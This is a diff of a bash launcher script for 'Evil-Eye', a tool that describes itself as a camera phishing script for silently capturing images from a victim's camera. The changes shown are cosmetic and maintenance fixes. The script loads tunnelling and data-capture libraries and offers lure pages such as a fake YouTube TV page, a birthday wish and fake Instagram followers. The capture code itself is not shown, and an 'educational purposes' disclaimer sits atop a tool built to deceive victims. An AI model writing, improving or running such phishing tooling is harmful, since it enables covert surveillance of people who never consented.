@@ -1,36 +1,37 @@
 #!/bin/bash
 # RGSecurityTeam - Evil-Eye
-# ecoding (utf-8 en)
+# encoding (utf-8 en)
 
-################################## Evil-Eye ####################################
+#────────────────────────────────── Evil-Eye ──────────────────────────────────#
 #                                                                              #
 # This is a modern camera phishing script. It is capable of silently capturing #
 # high-quality images of the victim's camera.                                  #
-#------------------------------------------------------------------------------#
+#──────────────────────────────────────────────────────────────────────────────#
 # DISCLAIMER: This tool is developed for educational purposes and authorized   #
-# penetration testing only.The developer of EvilEye is not responsible for     #
-# any misuse or damage caused by this program.                                 #
-#------------------------------------------------------------------------------#
+# penetration testing only. The developer (RGSecurityTeam) is not responsible  #
+# for any misuse or damage caused by this program.                             #
+#──────────────────────────────────────────────────────────────────────────────#
 # This is inspired by techchip's champhish script                              #
 #                                                                              #
-################################ RGSecurityTeam ################################
+#─────────────────────────────── RGSecurityTeam ───────────────────────────────#
 
 # Colors
-red="$(printf '\033[1;31m')"  
-green="$(printf '\033[1;32m')"  
+red="$(printf '\033[1;31m')"
+green="$(printf '\033[1;32m')"
 orange="$(printf '\033[1;93m')"
-blue="$(printf '\033[1;34m')" 
-cyan="$(printf '\033[1;36m')"  
-white="$(printf '\033[1;37m')" 
+blue="$(printf '\033[1;34m')"
+cyan="$(printf '\033[1;36m')"
+white="$(printf '\033[1;37m')"
 redbg="$(printf '\033[1;41m')"
 nocolor="$(printf '\e[0m')"
 
+# FIX #12: symlink-safe SCRIPT_DIR
+SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
+
 trap terminate INT
 
-SCRIPT_DIR=$(dirname "$0")
-
 # Load Source lib/
-load_lib(){
+load_lib() {
     local libs=("check_net.sh" "dis_detect.sh" "banners.sh" "pkage_check.sh" "setup_files.sh" "tunnel.sh" "capture_data.sh" "others.sh")
     for lib in "${libs[@]}"; do
         if [ -f "$SCRIPT_DIR/lib/$lib" ]; then
@@ -43,15 +44,15 @@ load_lib(){
 }
 
 # Load Tools
-load_tools(){
+load_tools() {
     { clear; small_banner | lolcat; banner2; echo; }
-    print_status "${white}Internet Connection" $int_status
-    check_requirements "lolcat" "jq" "php" "curl" "wget" "cloudflared" 
+    print_status "${white}Internet Connection" "$int_status"
+    check_requirements "lolcat" "jq" "php" "curl" "wget" "cloudflared"
     sleep 1
 }
 
 # Main Menu
-main_menu(){
+main_menu() {
     { clear; banner | lolcat; banner2; echo; }
 cat << EOF
     ${green}<<------ ${white}Select a Templates ${green}------>>${nocolor}
@@ -67,24 +68,18 @@ EOF
     read -p "    ${cyan}[${green}+${cyan}]${white} Select an options:${green} " templates
 
     case $templates in
-        1)
-        setup-youtube-tv;;
-        2)
-        setup_birthday_wish;;
-        3)
-        secret_msg;;
-        4)
-        fake_insta_follower;;
-        5)
-        chating_bot;;
-        6)
-        exit_msg;;
-        *)
-        invalid_options;;
+        1) setup-youtube-tv ;;
+        2) setup_birthday_wish ;;
+        3) secret_msg ;;
+        4) fake_insta_follower ;;
+        5) chating_bot ;;
+        6) exit_msg ;;
+        *) invalid_options ;;
     esac
 }
 
-
 load_lib
+kill_pid
+init_setup
 load_tools
 main_menu
